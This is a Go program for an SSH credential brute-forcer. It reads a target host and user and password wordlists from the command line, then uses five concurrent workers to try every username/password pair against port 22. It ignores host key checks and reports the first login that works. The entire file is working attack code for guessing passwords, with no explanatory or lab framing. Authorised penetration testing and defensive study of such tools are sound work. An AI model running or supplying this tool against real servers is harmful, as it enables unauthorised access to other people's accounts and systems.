package main

import (
	"bufio"
	"fmt"
	"os"
	"sync"

	"golang.org/x/crypto/ssh"
)

const WorkerPoolSize = 5

func parseArgs() (string, []string, []string, error) {
	var host string
	var usernames []string
	var passwords []string

	for i := 1; i < len(os.Args); i++ {
		arg := os.Args[i]
		switch arg {
		case "-h":
			if i+1 < len(os.Args) {
				host = os.Args[i+1]
				i++
			} else {
				return "", nil, nil, fmt.Errorf("missing value for -h")
			}
		case "-u":
			if i+1 < len(os.Args) {
				usernames = append(usernames, os.Args[i+1])
				i++
			} else {
				return "", nil, nil, fmt.Errorf("missing value for -u")
			}
		case "-U":
			if i+1 < len(os.Args) {
				file, err := os.Open(os.Args[i+1])
				if err != nil {
					return "", nil, nil, fmt.Errorf("could not open user list file: %v", err)
				}
				defer file.Close()
				scanner := bufio.NewScanner(file)
				for scanner.Scan() {
					usernames = append(usernames, scanner.Text())
				}
				i++
			} else {
				return "", nil, nil, fmt.Errorf("missing value for -U")
			}
		case "-p":
			if i+1 < len(os.Args) {
				passwords = append(passwords, os.Args[i+1])
				i++
			} else {
				return "", nil, nil, fmt.Errorf("missing value for -p")
			}
		case "-P":
			if i+1 < len(os.Args) {
				file, err := os.Open(os.Args[i+1])
				if err != nil {
					return "", nil, nil, fmt.Errorf("could not open password list file: %v", err)
				}
				defer file.Close()
				scanner := bufio.NewScanner(file)
				for scanner.Scan() {
					passwords = append(passwords, scanner.Text())
				}
				i++
			} else {
				return "", nil, nil, fmt.Errorf("missing value for -P")
			}
		}
	}

	if host == "" {
		return "", nil, nil, fmt.Errorf("target host (-h) must be specified")
	}

	if len(usernames) == 0 {
		return "", nil, nil, fmt.Errorf("either -u or -U must be specified for username/wordlist")
	}

	if len(passwords) == 0 {
		return "", nil, nil, fmt.Errorf("either -p or -P must be specified for password/wordlist")
	}

	return host, usernames, passwords, nil
}

func trySSH(host, username, password string) bool {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	address := fmt.Sprintf("%s:22", host)
	client, err := ssh.Dial("tcp", address, config)
	if err != nil {
		return false
	}
	defer client.Close()
	return true
}

func worker(host string, jobs <-chan [2]string, wg *sync.WaitGroup) {
	defer wg.Done()
	for job := range jobs {
		username, password := job[0], job[1]
		if trySSH(host, username, password) {
			fmt.Printf("Success: %s:%s\n", username, password)
			os.Exit(0)
		}
	}
}

func main() {
	host, usernames, passwords, err := parseArgs()
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}

	jobs := make(chan [2]string, WorkerPoolSize)
	var wg sync.WaitGroup

	for i := 0; i < WorkerPoolSize; i++ {
		wg.Add(1)
		go worker(host, jobs, &wg)
	}

	for _, username := range usernames {
		for _, password := range passwords {
			jobs <- [2]string{username, password}
		}
	}

	close(jobs)
	wg.Wait()
	fmt.Println("No valid credentials found!")
}
